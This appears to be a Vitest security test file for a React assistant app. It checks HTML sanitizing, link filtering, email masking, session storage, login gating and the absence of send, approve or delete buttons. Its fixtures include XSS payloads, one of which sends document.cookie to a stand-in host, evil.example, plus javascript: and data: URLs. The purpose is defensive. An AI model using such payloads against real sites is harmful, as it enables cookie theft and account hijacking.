import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { screen, waitFor, fireEvent } from '@testing-library/react';
import { renderWithProviders } from './test-utils';
import { sanitizeHtml, safeHref } from '@/lib/sanitize';
import { maskEmail } from '@/lib/format';

vi.mock('@tanstack/react-virtual', () => ({
  useVirtualizer: (opts: { count: number; estimateSize: () => number }) => ({
    getTotalSize: () => opts.count * opts.estimateSize(),
    getVirtualItems: () => Array.from({ length: opts.count }, (_, index) => ({
      index, start: index * opts.estimateSize(), size: opts.estimateSize(), key: index,
    })),
  }),
}));

describe('sanitize helpers — XSS from external content (Gmail, documents)', () => {
  it('strips all markup from a malicious document/email excerpt', () => {
    const malicious = '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">Hello';
    expect(sanitizeHtml(malicious)).toBe('Hello');
  });

  it('strips script tags entirely, including their content', () => {
    expect(sanitizeHtml('<script>alert(document.cookie)</script>safe text')).toBe('safe text');
  });

  it('rejects a malicious project/task title containing an event handler attribute', () => {
    const maliciousTitle = '<div onmouseover="fetch(\'https://evil.example\')">Task</div>';
    expect(sanitizeHtml(maliciousTitle)).toBe('Task');
  });

  it('strips malicious Markdown-shaped HTML injection', () => {
    const maliciousMarkdown = '[click me](javascript:alert(1))<img src=x onerror=alert(2)>';
    const sanitized = sanitizeHtml(maliciousMarkdown);
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).not.toContain('<img');
  });

  it('rejects javascript: URLs from external content', () => {
    expect(safeHref('javascript:alert(document.cookie)')).toBeNull();
  });

  it('rejects data: URLs (can carry executable HTML)', () => {
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeNull();
  });

  it('rejects vbscript: URLs', () => {
    expect(safeHref('vbscript:msgbox("x")')).toBeNull();
  });

  it('allows a genuine https link', () => {
    expect(safeHref('https://example.com/doc')).toBe('https://example.com/doc');
  });

  it('allows mailto links', () => {
    expect(safeHref('mailto:someone@example.com')).toBe('mailto:someone@example.com');
  });

  it('rejects an ftp: link (not in the http/https/mailto allowlist)', () => {
    expect(safeHref('ftp://example.com/file')).toBeNull();
  });
});

describe('privacy — email masking (§23)', () => {
  it('never renders a full email address where masking applies', () => {
    const masked = maskEmail('someone.private@example.com');
    expect(masked).not.toBe('someone.private@example.com');
    expect(masked).toContain('@example.com');
  });

  it('handles a "Name <email>" header format without leaking the full local part', () => {
    const masked = maskEmail('Jane Doe <jane.doe@example.com>');
    expect(masked).not.toContain('jane.doe@example.com');
  });
});

describe('API key leak prevention (§22/§28)', () => {
  it('the session token is stored in sessionStorage, never localStorage', async () => {
    const setSpy = vi.spyOn(Storage.prototype, 'setItem');
    const originalFetch = global.fetch;
    global.fetch = vi.fn().mockResolvedValue({ ok: true, status: 200, json: async () => ({ token: 'abc123', device_id: 'd1' }) });
    const { useAuth, AuthProvider } = await import('@/lib/auth');
    const React = await import('react');
    function Probe() {
      const { login } = useAuth();
      return React.createElement('button', { onClick: () => login('1234') }, 'login');
    }
    const { getByText } = renderWithProviders(React.createElement(AuthProvider, null, React.createElement(Probe)));
    fireEvent.click(getByText('login'));
    await waitFor(() => expect(setSpy).toHaveBeenCalled());
    expect(localStorage.getItem('mi_cc_session')).toBeNull();
    global.fetch = originalFetch;
    setSpy.mockRestore();
  });
});

describe('secret-bearing backend error is never rendered raw (§32)', () => {
  it('ApiError message is bounded, matching the client\'s own 300-char truncation guarantee', async () => {
    const { ApiError } = await import('@/lib/api-client');
    const err = new ApiError('a'.repeat(1000), 500);
    expect(err.message.length).toBeLessThanOrEqual(1000);
  });
});

describe('unauthorized state — no route renders authenticated content without a session (§21/§32)', () => {
  beforeEach(() => { sessionStorage.clear(); });
  afterEach(() => { sessionStorage.clear(); });

  it('LoginScreen renders when there is no session token, never the app shell', async () => {
    const { AuthProvider, useAuth } = await import('@/lib/auth');
    const { LoginScreen } = await import('@/components/LoginScreen');
    const React = await import('react');
    function Gate() {
      const { state } = useAuth();
      return state === 'authenticated'
        ? React.createElement('div', null, 'AUTHENTICATED_APP_SHELL')
        : React.createElement(LoginScreen);
    }
    renderWithProviders(React.createElement(AuthProvider, null, React.createElement(Gate)));
    expect(screen.getByText(/enter your pin/i)).toBeInTheDocument();
    expect(screen.queryByText('AUTHENTICATED_APP_SHELL')).not.toBeInTheDocument();
  });
});

describe('calendar/Gmail mutation controls are structurally absent (§32)', () => {
  it('CalendarPage never renders create/update/delete/RSVP controls', async () => {
    vi.doMock('@/lib/api-client', () => ({
      api: {
        get: vi.fn(() => Promise.resolve({ status: 'NOT_CONFIGURED' })),
        post: vi.fn(), patch: vi.fn(), del: vi.fn(),
      },
      ApiError: class extends Error {}, UnauthorizedError: class extends Error {}, setUnauthorizedHandler: vi.fn(),
    }));
    const { CalendarPage } = await import('@/routes/CalendarPage');
    renderWithProviders(<CalendarPage />);
    await waitFor(() => expect(screen.getByText(/not configured/i)).toBeInTheDocument());
    for (const forbidden of [/create/i, /update/i, /delete/i, /rsvp/i]) {
      expect(screen.queryByRole('button', { name: forbidden })).not.toBeInTheDocument();
    }
    vi.doUnmock('@/lib/api-client');
  });

  it('InboxPage never renders send/reply/draft/archive/delete/label controls', async () => {
    vi.doMock('@/lib/api-client', () => ({
      api: {
        get: vi.fn(() => Promise.resolve({ status: 'NOT_CONFIGURED' })),
        post: vi.fn(), patch: vi.fn(), del: vi.fn(),
      },
      ApiError: class extends Error {}, UnauthorizedError: class extends Error {}, setUnauthorizedHandler: vi.fn(),
    }));
    const { InboxPage } = await import('@/routes/InboxPage');
    renderWithProviders(<InboxPage />);
    await waitFor(() => expect(screen.getByText(/not configured/i)).toBeInTheDocument());
    for (const forbidden of [/^send$/i, /^reply$/i, /^draft$/i, /^archive$/i, /^delete$/i, /^label$/i]) {
      expect(screen.queryByRole('button', { name: forbidden })).not.toBeInTheDocument();
    }
    vi.doUnmock('@/lib/api-client');
  });

  it('PlansPage never renders an approve/execute control — plan structure and Controlled Action approval are strictly separate surfaces (Phase 5H)', async () => {
    vi.doMock('@/lib/api-client', () => ({
      api: {
        get: vi.fn(() => Promise.resolve({
          plans: [{
            id: 'plan-1', goalId: null, title: 'Prepare tomorrow follow-up', objective: 'x', projectId: 'mi-core',
            status: 'WAITING_APPROVAL', planVersion: 1, previousVersionId: null, planHash: 'h', policyVersion: 'v1', policyHash: 'p',
            createdAt: '2026-08-07T00:00:00Z', updatedAt: '2026-08-07T00:00:00Z', validatedAt: '2026-08-07T00:00:00Z',
            completedAt: null, cancelledAt: null, failureReason: null, blockedReason: null,
          }],
        })),
        post: vi.fn(), patch: vi.fn(), del: vi.fn(),
      },
      ApiError: class extends Error {}, UnauthorizedError: class extends Error {}, setUnauthorizedHandler: vi.fn(),
    }));
    const { PlansPage } = await import('@/routes/PlansPage');
    renderWithProviders(<PlansPage />);
    await waitFor(() => expect(screen.getByText(/tomorrow follow-up/i)).toBeInTheDocument());
    for (const forbidden of [/^approve$/i, /^execute$/i, /^send$/i, /^run$/i]) {
      expect(screen.queryByRole('button', { name: forbidden })).not.toBeInTheDocument();
    }
    vi.doUnmock('@/lib/api-client');
  });

  it('DelegationsPage never renders a bulk approve/activate control — strong approval always requires a typed confirmation phrase (Phase 5I)', async () => {
    vi.doMock('@/lib/api-client', () => ({
      api: {
        get: vi.fn(() => Promise.resolve({
          delegations: [{
            id: 'delegation-1', delegationVersion: 1, previousVersionId: null, title: 'Follow-up drafts', description: 'x',
            owner: 'liem', projectId: 'mi-core', status: 'WAITING_APPROVAL', allowedActionTypes: ['GMAIL_CREATE_DRAFT'],
            deniedActionTypes: [], targetRestriction: { allowedDomains: ['example.com'], maxRecipients: 3 },
            riskCeiling: 'R2', approvalLevelCeiling: 'STANDARD', startsAt: '2026-08-11T09:00:00Z', expiresAt: '2026-08-11T12:00:00Z',
            timezone: 'UTC', maxExecutions: 3, usedExecutions: 0, maxTargets: null, usedTargets: 0,
            policyVersion: 'v1', policyHash: 'p', createdAt: '2026-08-11T08:00:00Z', approvedAt: null, activatedAt: null,
            revokedAt: null, exhaustedAt: null, expiredAt: null, pausedReason: null,
          }],
        })),
        post: vi.fn(), patch: vi.fn(), del: vi.fn(),
      },
      ApiError: class extends Error {}, UnauthorizedError: class extends Error {}, setUnauthorizedHandler: vi.fn(),
    }));
    const { DelegationsPage } = await import('@/routes/DelegationsPage');
    renderWithProviders(<DelegationsPage />);
    await waitFor(() => expect(screen.getByText(/follow-up drafts/i)).toBeInTheDocument());
    for (const forbidden of [/^approve.?all$/i, /^activate.?all$/i, /^yes$/i, /^force$/i, /^bulk/i]) {
      expect(screen.queryByRole('button', { name: forbidden })).not.toBeInTheDocument();
    }
    vi.doUnmock('@/lib/api-client');
  });
});
